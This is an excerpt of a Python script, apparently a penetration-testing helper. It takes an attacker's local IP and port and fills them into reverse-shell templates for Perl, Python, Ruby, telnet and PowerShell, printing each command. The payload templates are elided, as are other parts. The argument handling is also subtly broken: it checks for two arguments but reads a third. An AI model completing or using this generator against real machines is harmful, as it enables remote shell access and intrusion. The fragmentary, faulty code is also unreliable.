...
# Grab Local IP and Local Port for Reverse Shell
if len(sys.argv) == 2:
	LHOST = sys.argv[1]
	LPORT = sys.argv[2]
...
def generate_shells(LHOST, LPORT):
	...
	cmd = re.sub('ADDRESS', LHOST, perl_rev)
	print(cmd)
	...
	cmd = re.sub('ADDRESS',LHOST, py_rev)
	print(cmd)
	...
	cmd = re.sub('ADDRESS', LHOST, ruby_win_rev)
	print(cmd)
	...
	cmd = re.sub('ADDRESS', LHOST, telnet_rev)
	print(cmd)
	...
	cmd = re.sub("ADDRESS", LHOST, power_rev)
	print(cmd)
